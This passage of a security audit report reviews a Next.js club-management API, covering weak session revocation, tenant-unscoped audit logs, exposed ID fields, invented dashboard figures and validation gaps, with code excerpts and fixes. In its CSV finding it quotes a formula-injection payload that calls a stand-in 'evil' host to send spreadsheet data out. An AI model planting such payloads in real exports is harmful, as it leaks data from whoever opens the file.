- **Fix:** `await logAudit({ user, action: 'UPDATE_SETTINGS', resourceType: 'SystemSettings', resourceId: <tenantId>, details: { fields: Object.keys(updateData) } })` before the 200. Audit coverage across the in-scope surface is tabulated in API-031.

---

### [API-018] Session revocation is never enforced — `logout-all`, session delete and password change leave tokens live — Severity: High

- **Location:** `app/api/auth/logout-all/route.ts:24-33`; `app/api/auth/sessions/[sessionId]/route.ts:25-39`; `app/api/auth/profile/password/route.ts:51-54`; against `app/api/auth/refresh/route.ts:52-68` and `db/schema/sessions.ts:4-22`
- **Evidence:**

```ts
// app/api/auth/logout-all/route.ts:24
    await db.update(sessions).set({ isActive: false, isExpired: true, logoutTime: new Date() })
      .where(and(eq(sessions.userId, userId), eq(sessions.isActive, true)));
```

Contrast `app/api/auth/logout/route.ts:39-46`, which *does* insert into `blacklistedTokens`. The refresh path is the only thing that can mint new access tokens, and it checks only the token blacklist and `users.status`:

```ts
// app/api/auth/refresh/route.ts:52-68 — no sessions lookup
    const [user] = await db.select({...}).from(users).where(eq(users.id, decoded.id)).limit(1);
    if (!user) throw new AuthError('User not found', 'USER_NOT_FOUND');
    if (user.status === 'suspended' || user.status === 'inactive') throw new AuthError(...);
```

And it is structurally unable to do better — `db/schema/sessions.ts:4-22` has **no token column**; a session row records only `sessionId`, IP, UA and device. There is no mapping from a session to the tokens issued for it.
- **Impact:** "Log out from all devices", "revoke this session" and "change my password" all leave every outstanding refresh token valid for up to 7 days. A user who revokes a compromised device sees it disappear from the list while the attacker keeps refreshing. Changing a compromised password does not evict the attacker.
- **Fix:** store a token hash (or the `sessionId`) on the session row and have `refresh` (and `getAuthContext`) require an active session; on `logout-all`, password change and session delete, insert the affected refresh tokens into `blacklistedTokens`. Until then, do not present these controls as security guarantees.

---

### [API-019] Login lockout is per-email only; the 7-day refresh token is returned in the JSON body — Severity: High

- **Location:** `app/api/auth/login/route.ts:127-150`, `:273-279`; `lib/utils/jwt.ts:5`; `lib/utils/cookies.ts:26-32`
- **Evidence:**

```ts
// :127-137 — the counter is keyed on email only
    const [failedCountResult] = await db.select({ count: count() }).from(loginAttempts)
      .where(and(
        eq(loginAttempts.email, normalizedEmail),
        eq(loginAttempts.success, false),
        gte(loginAttempts.timestamp, lockoutSince),
      ));
    if ((failedCountResult?.count ?? 0) >= LOCKOUT_THRESHOLD) {   // 5, line 16
```

There is no per-IP dimension and no global IP throttle, and `login_attempts` rows are never pruned (`MAX_LOGIN_HISTORY` is declared at line 18 and never used).

```ts
// :273-279
    const response = NextResponse.json({ ...user, accessToken: tokens.accessToken, refreshToken: tokens.refreshToken });
    setAuthCookies(response.cookies, tokens.accessToken, tokens.refreshToken);
```

The same 7-day refresh token is also set as an `httpOnly` cookie (`lib/utils/cookies.ts:26`) — returning it in the body makes it reachable from any XSS and defeats the `httpOnly` control entirely.
- **Impact:** (a) 5 wrong passwords from anywhere lock a known account for 15 minutes — a cheap targeted DoS; (b) a password spray across many emails from one IP is unthrottled; (c) one XSS yields a 7-day credential that survives the cookie being cleared.
- **Fix:** key the lockout on `(email, ip)` and add a separate per-IP rate limit; prune `login_attempts` older than the window; stop returning `refreshToken` in the JSON body (return it only as the `httpOnly` cookie); cap the request body size before `comparePassword`.

---

### [API-020] Refresh rotation has no reuse detection and leaves the old access token valid — Severity: High

- **Location:** `app/api/auth/refresh/route.ts:70-93`
- **Evidence:**

```ts
    // Rotate: blacklist old token, generate new pair
    const expiry = getTokenExpiry(refreshToken);
    try {
      await db.insert(blacklistedTokens).values({ token: refreshToken, type: 'refresh', userId: decoded.id, expiresAt: expiry, reason: 'rotation' });
      blacklistToken(refreshToken, expiry);
    } catch (insertError: any) {
      if (insertError?.code === '23505') { throw new AuthError('Token has been revoked or already rotated', 'TOKEN_REVOKED'); }
```

The 23505 branch correctly detects double-rotation, but it is treated as a plain error: nothing is logged to the audit trail, no alarm is raised, and the family is not revoked. Only the **refresh** token is blacklisted — the access token issued alongside it stays valid for its full 15 minutes.
- **Impact:** a stolen-then-legitimately-rotated refresh token is detected but ignored. Standard practice is to treat reuse of a rotated token as theft and revoke the whole family (the `sessions` table has no family/session link to revoke, per API-018).
- **Fix:** bind a `sessionId` into the refresh token, and on 23505 revoke every session of that user, write a `TOKEN_REUSE_DETECTED` audit row, and notify. Also blacklist the superseded access token.

---

### [API-021] `GET /api/members/[id]` returns national-ID and address fields that the list endpoint deliberately masks — Severity: High

- **Location:** `app/api/members/[id]/route.ts:43-47`, `:75`; versus `server/src/modules/members/service.ts:19-36`, `:86-92`
- **Evidence:**

```ts
// app/api/members/[id]/route.ts:43
    const [member] = await db
      .select()                    // ← every column
      .from(members)
      .where(scope ? and(idMatch, scope) : idMatch)
      .limit(1);
...
    return NextResponse.json({ success: true, data: { ...member, deposits } });
```

The list endpoint uses an explicit allowlist (`MEMBER_FIELDS`, `service.ts:19-36`) that omits `nidOrPassport`, `fatherName`, `motherName`, `spouseName`, `address`, `nomineeNidOrPassport` and `nomineePhone` (all present in `db/schema/members.ts:30-38`) and then redacts what remains:

```ts
// server/src/modules/members/service.ts:86-92
  const canViewSensitive = userRole === 'Admin' || userRole === 'Manager';
  const data = rows.map(({ totalCount: _totalCount, ...rest }) => {
    const isOwnRecord = userId && rest.userId === userId;
    if (canViewSensitive || isOwnRecord) return rest;
    return { ...rest, phone: undefined, address: undefined };
  });
```

The detail route has no such gate — it only requires `MEMBERS:READ` (line 37).
- **Impact:** any user with read access to the members screen (a Manager, or any Member carrying a `MEMBERS:READ` override) can read every member's national ID/passport, home address, family names and nominee NID through `GET /api/members/[id]`, exactly the data the list endpoint refuses to hand out. Note also `service.ts:86` compares the **raw** role string, so a user stored as `Administrator` is treated as non-sensitive and gets redacted while `normalizeRole` elsewhere treats them as an Admin.
- **Fix:** select an explicit column list in `[id]` and apply the same `canViewSensitive` rule with `normalizeRole(user.role)`; return `null` (not `undefined`) for redacted fields so the client sees a stable shape.

---

### [API-022] `PUT /api/members/[id]` writes an unvalidated `role` — Severity: High

- **Location:** `app/api/members/[id]/route.ts:131`; versus `app/api/members/route.ts:51`
- **Evidence:**

```ts
// PUT, line 131
    if (body.role !== undefined) patch.role = String(body.role);
// POST, line 51
    const role = typeof body.role === 'string' && MEMBER_ROLES.includes(body.role) ? body.role : 'Member';
```

The create path enforces a 7-value allowlist; the update path applies `String(...)` to whatever arrives. `status` two lines below *is* allowlisted (`UPDATABLE_STATUS`, line 133) — so the file is internally inconsistent.
- **Impact:** arbitrary strings land in `members.role`. Login authority derives from `users.role`, so this is not a direct auth bypass, but every member list, filter (`role=` in `listMembers`) and any code that treats `members.role` as authoritative will be wrong, and the UI's role filter will silently miss records.
- **Fix:** reuse the same `MEMBER_ROLES` allowlist (export it from one module) and reject — or ignore — anything else, exactly as `status` does at line 133.

---

### [API-023] The audit trail is neither tenant-scoped nor attributable, and `/api/audit*` has no tenant filter — Severity: High

- **Location:** `lib/utils/audit.ts:20-30`; `app/api/audit/route.ts:84`, `:94-95`, `:103`; `app/api/audit/metadata/route.ts:27-28`; `app/api/audit/notifications/route.ts:46-52`; `app/api/analytics/stats/route.ts:73-82`
- **Evidence:** the writer never sets `tenantId`, although the column and its index exist:

```ts
// lib/utils/audit.ts:20-30
    await db.insert(auditLogs).values({
      userId: params.user?.id || null,
      userName: params.user?.name || null,
      action: params.action,
      ...
      status: params.status || 'SUCCESS',
    });
```

so every row is `tenant_id = NULL` and the readers cannot scope:

```ts
// app/api/audit/route.ts:83-84
      db.select({ count: count() }).from(auditLogs).where(whereClause),   // no tenant predicate
```

`/api/audit` also selects `ipAddress` and `userAgent` (94-95) and left-joins `users` for `userEmail`/`userRole` (99-103) — so an Admin or Manager of tenant A sees the IP addresses, user agents, emails and roles of users in every other tenant. `analytics/stats:80-82` shows the last 5 platform-wide audit actions on tenant A's dashboard.
- **Impact:** the audit trail — the artifact an auditor relies on — cannot answer "who did what in my club", and is itself a cross-tenant PII leak. `logAudit` also has no `user` at several call sites (`app/api/auth/login/route.ts:265`, `register:143`, `logout:66`, `logout-all:35`) so those rows have `userId: NULL` too.
- **Fix:** add `tenantId` to `AuditParams` and to the insert; require it at every call site; add `eq(auditLogs.tenantId, tenantId)` to all three `/api/audit` routes and to `analytics/stats`; backfill existing rows; pass `user` at the four auth call sites.

---

### [API-024] `GET /api/analytics/stats` invents dashboard numbers when the tenant is empty — Severity: High

- **Location:** `app/api/analytics/stats/route.ts:101-111`
- **Evidence:**

```ts
    const stats: AnalyticsStats = {
      totalAssets: totalAssets > 0 ? totalAssets : 4850000,
      totalMembers: totalMembers > 0 ? totalMembers : 24,
      activeProjects: activeProjects > 0 ? activeProjects : 6,
      totalDividendsDistributed: totalDividendsDistributed > 0 ? totalDividendsDistributed : 420000,
      monthlyGrowthRate: 8.5,
      totalDeposits: totalDeposits > 0 ? totalDeposits : 5200000,
      totalExpenses: totalExpenses > 0 ? totalExpenses : 1350000,
      netReserveBalance: netReserves > 0 ? netReserves : 3850000,
      recentActivities,
    };
```

Every zero is replaced with a hard-coded constant, and `monthlyGrowthRate` is a literal with no computation behind it at all. Lines 18-30 also degrade to an **unfiltered** query when `tenantId` is null.
- **Impact:** a new or empty club sees 4.85M in assets, 24 members, 6 projects and 420K in dividends distributed — invented financial figures, presented identically to real ones, on the dashboard members and auditors look at. This is a data-integrity defect, not a cosmetic placeholder.
- **Fix:** return the real aggregate (0 when empty) and, if an empty-state illustration is wanted, put it in the UI behind an explicit `isEmpty` flag. Fail closed on a null `tenantId` rather than widening the query.

---

### [API-025] `POST /api/governance/penalties` and `[id]/waive` are neither idempotent nor tenant-scoped — Severity: High

- **Location:** `app/api/governance/penalties/route.ts:188-205`; `app/api/governance/penalties/[id]/waive/route.ts:36-40`, `:43-45`
- **Evidence:** the insert has no natural key and `db/schema/member_penalties.ts` declares no unique constraint, so a double-submit issues two penalties and applies the `warningCount + 1` / `totalContributed - deduction` of lines 167-185 twice. The waive lookup is by id alone:

```ts
// waive/route.ts:36-40
      const [penalty] = await tx.select().from(memberPenalties)
        .where(eq(memberPenalties.id, id))
        .limit(1);
```

The `status === 'WAIVED'` guard at 43-45 *is* a correct idempotency guard — but it returns `ValidationError` (400) where the sibling duplicate-email path in `app/api/members/route.ts:65` uses `ConflictError` (**409**) for the same class of condition.
- **Impact:** a double-clicked "Issue penalty" doubles a financial deduction with no ledger record of either; an Admin of any tenant can waive any tenant's penalty (which *adds money back* to a member's `totalContributed`, line 54); the 400-vs-409 disagreement forces clients to handle two codes for "already done".
- **Fix:** require an idempotency key or a `(memberId, meetingId, tier, reason-hash)` unique index; add `eq(memberPenalties.tenantId, tenantId)`; throw `ConflictError` (409) on the already-waived path.

---

### [API-026] Unbounded `limit` and unvalidated `page` on every hand-rolled list endpoint — Severity: High

- **Location:** `app/api/meetings/route.ts:18-20`; `app/api/governance/penalties/route.ts:19-21`; `app/api/expenses/route.ts:26-28`; `app/api/goals/route.ts:41-60`; `app/api/analytics/analysis/route.ts:93-103`; `app/api/projects/[id]/route.ts:31-36`
- **Evidence:**

```ts
// app/api/meetings/route.ts:18-20
    const page = parseInt(searchParams.get('page') || '1', 10);
    const limit = parseInt(searchParams.get('limit') || '20', 10);
    const skip = (page - 1) * limit;
```

A correct helper already exists and is used by only one endpoint:

```ts
// lib/utils/types.ts:24-26
  const page = Math.max(1, parseInt(query.page) || defaults?.page || 1);
  const limit = Math.min(100, Math.max(1, parseInt(query.limit) || defaults?.limit || 20));
```

`app/api/governance/penalties/route.ts:8` even **imports** `getPaginationParams`/`formatPaginatedResponse` and then does not use them (lines 19-21 parse by hand). `app/api/analytics/analysis/route.ts:93-103` loads an entire year of every transaction with no `.limit()` and aggregates it in JavaScript (lines 129-140).
- **Impact:** `?limit=100000000` is an unthrottled full-table read and serialisation; `?page=abc` makes `skip` NaN and `?limit=0` makes `totalPages` `Infinity`, which `JSON.stringify` emits as `null` (`Math.ceil(total/0) || 1` at meetings:78, penalties:87, expenses:117); `?year=abc` in `analysis:29` yields `new Date(NaN,0,1)` and a 500.
- **Fix:** use `getPaginationParams` everywhere (it caps at 100 and clamps `page`); add `.limit()` to the `analytics/analysis` year query or move the aggregation into SQL `GROUP BY`; validate `year` with a `z.coerce.number().int().min(2000).max(2100)`.

---

### [API-027] Two endpoints the UI calls do not exist — Severity: High

- **Location:** `app/meetings/page.tsx:97`, `app/governance/page.tsx:112`
- **Evidence:**

```ts
// app/meetings/page.tsx:97
        return await apiClient(`/meetings/${meetingId}/complete`, {
// app/governance/page.tsx:112
        return await apiClient("/governance/performance/recalculate-all", {
```

Neither path exists in the 70-file route table. `app/api/meetings/` contains only `route.ts`, `[id]/route.ts` and `[id]/attendance/route.ts`; `app/api/governance/` contains only `penalties/route.ts`, `penalties/[id]/waive/route.ts` and `rules/route.ts`.
- **Impact:** both user actions return `404` at runtime. The meeting "complete" action is also the natural place for the `warningCount` reconciliation in API-012, and the performance recalculation is a governance feature that silently does nothing.
- **Fix:** implement `POST /api/meetings/[id]/complete` (status transition + `completedAt` + attendee reconciliation) and either implement `POST /api/governance/performance/recalculate-all` or remove the call and its button.

---

### [API-028] `err.message` is returned raw to the client on 19 handlers, and the client renders it in a toast — Severity: Medium

- **Location:** goals `[2]` (`route.ts:69,122`; `[id]/route.ts:53,129,176`), meetings (`route.ts:84,141`; `[id]/route.ts:70,145,193`; `attendance/route.ts:107`), projects (`[id]/route.ts:60,130,188`; `updates/route.ts:100`), governance (`penalties/route.ts:93,226`; `[id]/waive/route.ts:100`; `rules/route.ts:28`), reports (`generate/[type]/route.ts:240`; `export-generic/route.ts:61`), analytics (`stats/route.ts:117`; `analysis/route.ts:300`), `app/api/members/[id]/route.ts:17-24`
- **Evidence:**

```ts
// app/api/goals/route.ts:66-71
  } catch (err: any) {
    console.error('[GOALS GET ERROR]', err);
    return NextResponse.json(
      { success: false, message: err.message || 'Failed to fetch goals' },
      { status: err.statusCode || 500 }
    );
  }
```

`err.statusCode` is `undefined` for a raw driver error, so the status is always 500 and the message is the driver text (`duplicate key value violates unique constraint "members_email_key"`, `invalid input syntax for type uuid: "abc"`). The legacy kernel masks it: `server/src/middleware/api.ts:76` `appErr.statusCode >= 500 ? 'An unexpected error occurred' : appErr.message`. And the client surfaces it verbatim by design (`lib/api-client.ts:64-65`, `errorMsg = errorData.message`).
- **Impact:** schema/constraint internals and driver messages reach the browser, and via the "unmasked toast" convention (`AGENTS.md §11`) they are shown to end users. It also makes genuine 4xx conditions that happen to be raised as driver errors look like 500s.
- **Fix:** adopt the legacy mask in the Next-native handlers — return `AppError`'s message for `statusCode < 500` and a fixed string otherwise; log the raw error server-side only.

---

### [API-029] `GET /api/reports/generate/[type]` returns a fabricated report for an unknown type and ignores `format` — Severity: Medium

- **Location:** `app/api/reports/generate/[type]/route.ts:51`, `:60`, `:63`, `:108`, `:137`, `:172`, `:207-216`
- **Evidence:**

```ts
    const format = (searchParams.get('format') || 'csv').toLowerCase();   // :51 — never used
...
    else {
      exportData = [
        {
          Report: reportType,
          GeneratedAt: new Date().toISOString(),
          Status: 'Active',
          Note: 'Export generated with active multi-tenant ledger synchronization.',
        },
      ];
    }
```

Type matching is substring `includes()` (`:63`, `:108`, `:137`, `:172`), so `/api/reports/generate/nolegder` matches `'ledger'`, and anything unrecognised lands in the fake branch with HTTP 200.
- **Impact:** a client typo silently produces a plausible-looking one-row CSV that claims `Status: 'Active'` and a multi-tenant sync that never happened; `?format=json` is ignored so a JSON-expecting client receives CSV with a 200.
- **Fix:** `switch` on an exact allowlist, return **404** for anything else, honour or reject `format`, and drop the fabricated row.

---

### [API-030] CSV export has no formula-injection guard — Severity: Medium

- **Location:** `app/api/reports/export-generic/route.ts:9-24`; `app/api/reports/generate/[type]/route.ts:20-35`, `:124-134`, `:192-204`
- **Evidence:**

```ts
      const str = val instanceof Date ? val.toISOString() : typeof val === 'object' ? JSON.stringify(val) : String(val);
      const escaped = str.replace(/"/g, '""');
      return `"${escaped}"`;
```

Quoting is correct; the missing piece is a leading-character guard. Both endpoints emit free-text columns straight from the DB — `members.name`, `transactions.description`, `memberPenalties.reason` (`:200`) — and `export-generic` emits **entirely client-supplied** objects with no permission check at all.
- **Impact:** a member named `=HYPERLINK("http://evil/?"&A1,"x")` or a penalty `reason` beginning with `+`/`-`/`@` becomes a live formula when the recipient opens the file in Excel — a stored client-side code-execution vector against whoever opens the export.
- **Fix:** prefix any cell whose first non-whitespace character is `= + - @` with a single quote (or a tab) before quoting; factor `convertToCsv` into one shared module (it is duplicated verbatim in both files) and add a test.

---

### [API-031] Audit coverage gaps on five mutations — Severity: Medium

- **Location:** `app/api/settings/route.ts:301`; `app/api/auth/refresh/route.ts`; `app/api/auth/sessions/[sessionId]/route.ts:25`; `app/api/auth/profile/password/route.ts:51`; `app/api/settings/share-value-status/route.ts:40`
- **Evidence:** every other in-scope mutation awaits `logAudit` (`members/route.ts:94`, `members/[id]/route.ts:169,220`, `goals/route.ts:106`, `goals/[id]/route.ts:113,162`, `meetings/route.ts:125`, `meetings/[id]/route.ts:129,179`, `attendance/route.ts:92`, `projects/[id]/route.ts:114,173`, `updates/route.ts:84`, `penalties/route.ts:210`, `waive/route.ts:84`, `expenses/route.ts:272`, `reports/generate/[type]/route.ts:218`). The five above do not. `app/api/auth/refresh/route.ts` has no `logAudit` import at all, so a 23505 token-reuse detection (API-020) is invisible.
- **Impact:** a settings change, a token rotation, a session revocation and a password change are all invisible in the audit log. Failed logins are also unrecorded there — `login/route.ts` calls `logAudit` only on the success path (line 265), so brute-force attempts never appear in `/api/audit`.
- **Fix:** add `logAudit` calls at the five sites (and a `LOGIN_FAILED` row with `status: 'FAILURE'` in `login/route.ts`'s error path).

---

### [API-032] Client/server permission divergence: `permissions: {}` on login vs `getDefaultPermissions` on the server — Severity: Medium

- **Location:** `app/api/auth/login/route.ts:51-54`; `app/api/auth/register/route.ts:44-47`; `app/api/auth/users/route.ts:24-27`; `app/api/auth/me/route.ts:24-27`; versus `lib/middleware/auth.ts:318-321`
- **Evidence:**

```ts
// login/route.ts:51 — what the browser receives
  const permissions: Record<string, string> =
    typeof row.permissions === 'object' && row.permissions !== null
      ? (row.permissions as Record<string, string>)
      : {};
```

```ts
// lib/middleware/auth.ts:318 — what the server enforces
  const permissions: Record<string, string> =
    typeof user.permissions === 'object' && user.permissions !== null
      ? (user.permissions as Record<string, string>)
      : getDefaultPermissions(user.role || 'Member');
```

A user whose `permissions` column is NULL gets `{}` in the login/`me` payload and the full role baseline in `getAuthContext`.
- **Impact:** the UI (driven by `lib/permissions.ts` against the login payload) shows an empty menu while the API happily authorises writes. Users report "I can't see the menu but the API works"; support has no way to diagnose it. The same fallback is copy-pasted in five files, and `login/route.ts:40-48` omits the `SuperAdmin` case that `lib/middleware/auth.ts:92` handles.
- **Fix:** export one `resolvePermissions(role, stored)` from `lib/middleware/auth.ts` (or `lib/permissions.ts`) and use it in all five response builders; delete the four duplicated `ALL_SCREENS`/`getDefaultPermissions`/`toUserResponse` copies.

---

### [API-033] `GET /api/auth/me`, `/api/auth/sessions`, `/api/auth/users` return four different data envelopes — Severity: Medium

- **Location:** `app/api/auth/me/route.ts:68`; `app/api/auth/users/route.ts:67`; `app/api/auth/sessions/route.ts:50-53`; `app/api/auth/login-history/route.ts:56-59`; `app/api/auth/login/route.ts:273-277`
- **Evidence:**

```ts
// me:68         → bare object
    return NextResponse.json(toUserResponse(user));
// users:67      → bare ARRAY
    return NextResponse.json(rows.map(toUserResponse));
// sessions:50   → {success, data:{sessions:[…]}}   (object nested in object)
    return NextResponse.json({ success: true, data: { sessions: sessionsData } });
// login-history:56 → {success, data:{loginHistory:[…]}}  (different key!)
    return NextResponse.json({ success: true, data: { loginHistory } });
// login:273     → bare user fields + tokens, no `success` at all
    const response = NextResponse.json({ ...user, accessToken, refreshToken });
```

Meanwhile the business routes use `{success, data, pagination}` (expenses:110), `{success, data, meta}` (audit:110) or a bare object (settings:129).
- **Impact:** `lib/api-client.ts:77` returns the parsed body unchanged, so a caller must know per-endpoint that `res.success` may be `undefined`, that the array may be the top level, and that the collection may be under `sessions` or `loginHistory`. Any generic wrapper (`res.data.map(...)`) breaks on the bare-array variant.
- **Fix:** adopt one envelope — `{success, data}` on every 2xx, `{success:false, message, code}` on every error — and add a response-shape test over the route table.

---

### [API-034] Two pagination contracts across sibling list endpoints — Severity: Medium

- **Location:** `{data, meta}`: `lib/utils/types.ts:33-51` used by `app/api/audit/route.ts:110` and `server/src/modules/members/service.ts:94`; `{data, pagination:{page,limit,total,totalPages}}`: `app/api/meetings/route.ts:74-79`, `app/api/governance/penalties/route.ts:83-88`, `app/api/expenses/route.ts:113-118`, `app/api/transactions/route.ts:126`
- **Evidence:** `meta` carries `total, page, limit, pages, hasNext, hasPrev, from, to`; `pagination` carries `page, limit, total, totalPages` — different key names (`pages` vs `totalPages`) and a different field set for the same concept.
- **Impact:** a shared pagination component cannot consume both; `hasNext` is only available on the `{data,meta}` routes. The codebase already documents this confusion in a client comment: `components/deposits/shared.ts:55` — *"GET /api/deposits returns { success, data, pagination, sum } (not the shared …)"*.
- **Fix:** pick `formatPaginatedResponse` (`lib/utils/types.ts:33`) as the single shape and delete the inline `pagination` literals in the four handlers.

---

### [API-035] `POST /api/expenses` and four siblings disagree on the success status code — Severity: Medium

- **Location:** `app/api/expenses/route.ts:290`; versus `app/api/goals/route.ts:118`, `app/api/meetings/route.ts:137`, `app/api/governance/penalties/route.ts:222`, `app/api/projects/[id]/updates/route.ts:96`, `app/api/members/route.ts:102-105`, `app/api/auth/register/route.ts:151-158`
- **Evidence:** `POST /api/expenses` returns `NextResponse.json({success, data, message})` with the **default 200**, while the other seven creates in scope return `{status: 201}`.
- **Impact:** a client that keys retry/cache behaviour off 201 will treat a successful expense as a duplicate-able call, and generic "created" handling has to special-case this endpoint.
- **Fix:** return 201 from `POST /api/expenses` (and audit the whole create surface for the same inconsistency).

---

### [API-036] Hard deletes with no tombstone, while a soft-delete table sits unused — Severity: Medium

- **Location:** `app/api/goals/[id]/route.ts:160`; `app/api/meetings/[id]/route.ts:177`; `app/api/members/[id]/route.ts:218`; versus `app/api/projects/[id]/route.ts:163-171`; `db/schema/deleted_records.ts`
- **Evidence:** goals and members are removed with `db.delete(...)` outright. The soft-delete primitive `deletedRecords` (`originalId`, `collectionName`, `data`, `reason`, `deletedBy`) exists and is exported (`db/schema/index.ts:14`) but the only writer in the whole tree is the legacy `server/src/modules/finance/service.ts:1175`; the live app never writes a row. Meanwhile `app/api/projects/[id]/route.ts:163` soft-cancels a project and `app/api/expenses` filters on `transactions.isDeleted` (line 45).
- **Impact:** three different deletion semantics in one surface — hard delete (goals, meetings, members), status cancel (projects), `isDeleted` flag (transactions) — and the "deleted" rows are unrecoverable, so a mistaken delete of a goal or a meeting cannot be undone or explained.
- **Fix:** pick one model. For regulated records, use the `deleted_records` tombstone (or add `deletedAt`/`deletedBy` to the entity) and make the list queries filter it; at minimum refuse deletion once dependent rows exist, as `app/api/members/[id]/route.ts:214-216` already does for ledger history.

---

### [API-037] `PUT /api/projects/[id]` and `PUT /api/goals/[id]` write unvalidated enums and can store `"NaN"` — Severity: Medium

- **Location:** `app/api/projects/[id]/route.ts:99-101`; `app/api/goals/route.ts:97`, `app/api/goals/[id]/route.ts:91-92`, `:94`
- **Evidence:**

```ts
// projects/[id]/route.ts:99-101
    if (body.budget !== undefined) updateFields.budget = String(Number(body.budget));
    if (body.expectedRoi !== undefined) updateFields.expectedRoi = String(Number(body.expectedRoi));
    if (body.status !== undefined) updateFields.status = body.status;      // no allowlist
```

```ts
// goals/route.ts:97
        targetAmount: String(Number(targetAmount)),
```

`String(Number("abc"))` is `"NaN"`, which a `decimal(15,2)` column rejects → 500 with the driver text (API-028). `status`/`type` are written from the body with no enum check, unlike `lib/utils/validation.ts:52-58` which enum-constrains the analogous settings fields.
- **Impact:** a malformed payload yields an opaque 500 rather than a 400, and `type`/`status` can hold arbitrary strings that later break the UI's filter options.
- **Fix:** add `z.enum` for `status`/`type`, `z.coerce.number().positive().multipleOf(0.01)` for the amounts, and reuse the `updateSettingsSchema` pattern (`lib/utils/validation.ts:35`) for goals/projects/meetings — none of which currently have a Zod schema at all (API-040).

---

### [API-038] `/api/audit` search is an unindexed jsonb-to-text scan; `sortBy` is silently ignored — Severity: Medium

- **Location:** `app/api/audit/route.ts:52`, `:72-76`, `:79-81`
- **Evidence:**

```ts
    if (query.search) {
      conditions.push(
        sql`(${auditLogs.userName} ILIKE ${'%' + query.search + '%'} OR ${auditLogs.details}::text ILIKE ${'%' + query.search + '%'})`,
      );
    }
    const orderByClause = query.sortOrder === 'asc' ? asc(auditLogs.createdAt) : desc(auditLogs.createdAt);
```

Casting a `jsonb` column to `text` and running `ILIKE '%…%'` cannot use the only index on the table (`idx_audit_tenant_created` on `(tenantId, createdAt desc)`, `db/schema/audit_logs.ts:20`) → a sequential scan per search. Separately, `getPaginationParams` returns `sortBy` at line 52 and the handler never uses it, so the UI's sort control does nothing. `endDate` is applied as `lte(createdAt, new Date(endDate))` (line 69), which silently excludes the entire final day of the range.
- **Impact:** a growing audit table makes each search a full scan; a user-visible sort is inert; date-range reports are off by one day.
- **Fix:** add a `pg_trgm` GIN index on `userName` and on `details::text` (or a dedicated `search_text` column populated at write time), map `sortBy` through a `SORTABLE_COLUMNS` allowlist exactly as `server/src/modules/members/service.ts:9-17,70` already does, and make `endDate` inclusive by adding one day.

---

### [API-039] `POST /api/auth/forgot-password` generates no token and sends no email — Severity: Medium

- **Location:** `app/api/auth/forgot-password/route.ts:29-43`
- **Evidence:**

```ts
    if (user) {
      await logAudit({ user: { id: user.id, name: user.name }, action: 'PASSWORD_RESET_REQUESTED', ... });
    }

    // Always return success to prevent email enumeration attacks
    return NextResponse.json({
      success: true,
      message: 'If an account matches this email, password recovery instructions have been sent.',
    });
```

The enumeration defence is correct, but nothing is generated, stored or sent: no reset token, no expiry, no single-use record, and no `reset-password` route exists anywhere in `app/api/`. A user who forgets their password has no recovery path at all.
- **Impact:** the endpoint's success message is false. Account recovery depends entirely on an Admin using `PUT /api/members/[id]`-style manual intervention, which does not exist for passwords.
- **Fix:** either implement the flow (`crypto.randomBytes(32)` token, hash at rest, `expiresAt`, single-use column, a `POST /api/auth/reset-password` consumer, an email transport) or return `501` and remove the "instructions have been sent" claim.

---

### [API-040] `lib/utils/validation.ts` is 4/6 dead, and there is no schema for members/goals/meetings/projects/penalties — Severity: Medium

- **Location:** `lib/utils/validation.ts:3-33`; `app/api/settings/route.ts:8`; `app/login/page.tsx:25`
- **Evidence:** the module exports `loginSchema`, `registerSchema`, `updateUserSchema`, `changePasswordSchema`, `adminPasswordResetSchema` and `updateSettingsSchema`. Only two are imported anywhere (verified by grep): `loginSchema` — in the **client** page `app/login/page.tsx:25`, not the API — and `updateSettingsSchema` in `app/api/settings/route.ts:8`. `registerSchema`, `updateUserSchema`, `changePasswordSchema` and `adminPasswordResetSchema` are dead; the auth routes hand-roll their validation instead. And there is no exported schema for members, goals, meetings, projects or penalties, which is why those routes use ad-hoc `if` blocks (API-042).
- **Impact:** the declared security policy in `registerSchema.role` (line 12, an enum that includes `'Admin'`) and `updateUserSchema.role` (line 20) would permit caller-chosen roles if either were ever wired to a route — a latent privilege-escalation schema sitting next to the hand-rolled code that is actually used. The settings schema is the only place in the codebase with range/enum validation.
- **Fix:** add `createMemberSchema`/`updateMemberSchema`/`createGoalSchema`/`createMeetingSchema`/`attendanceSchema`/`createProjectSchema`/`projectUpdateSchema`/`penaltySchema` and `.parse()` them in the corresponding handlers; delete the four unused schemas (or wire them and remove the duplicated inline checks).

---

### [API-041] Mass assignment is prevented on settings but not on the legacy fund update — Severity: Medium

- **Location:** `app/api/settings/route.ts:165-178`; versus `server/src/modules/members/handlers.ts:97`
- **Evidence:** settings is the one handler that validates before writing:

```ts
    const validation = updateSettingsSchema.safeParse(body);
    if (!validation.success) { ... 400 ... }
    const data: UpdateSettingsInput = validation.data;
```

(Zod's default `.strip()` also drops unknown keys, so `tenantId`/`id` cannot be injected — correct.) The legacy kernel does the opposite:

```ts
// server/src/modules/members/handlers.ts:92-97
export async function handleUpdateFund(request: NextRequest, id: string) {
  try {
    assertUuid(id);
    await requirePermission('FUNDS_MANAGEMENT', 'WRITE');
    const body = (await request.json()) as Record<string, unknown>;
    const fund = await fundsService.updateFund(id, body as never);   // ← the entire raw body
```

`body as never` is a cast that defeats the type checker: every column of `funds` is writable from the request, including `tenantId`, `balance` and `isDeleted`.
- **Impact:** `PUT /api/funds/[id]` (owned by the funds auditor) allows a Manager to move a fund to another tenant, inflate its balance, or mark it deleted. Flagged here because the root cause is in the shared legacy kernel and because the *correct* pattern is already demonstrated 20 lines away in the Next-native settings handler.
- **Fix:** define a Zod `updateFundSchema` and `.parse()` the body (the legacy `listFundsQuerySchema` at `handlers.ts:42-50` already shows the pattern for the read side). Cross-reference: `app/api/funds/**` is another auditor's scope.

---

### [API-042] Sibling routes apply different validation to the same field — Severity: Medium

- **Location:** `app/api/members/[id]/route.ts:131` vs `app/api/members/route.ts:51`; `app/api/members/[id]/route.ts:133` vs `app/api/goals/[id]/route.ts:94`; `app/api/goals/[id]/route.ts:81` vs `:156`; `app/api/meetings/[id]/route.ts:86` vs `:162`
- **Evidence:**
  - `role`: allowlisted on create (`members/route.ts:51`, `MEMBER_ROLES`), free-form on update (`members/[id]/route.ts:131`) — API-022.
  - `status`: allowlisted for members (`members/[id]:133`, `UPDATABLE_STATUS`), free-form for goals (`goals/[id]:94`), projects (`projects/[id]:101`) and meetings (`meetings/[id]:115`).
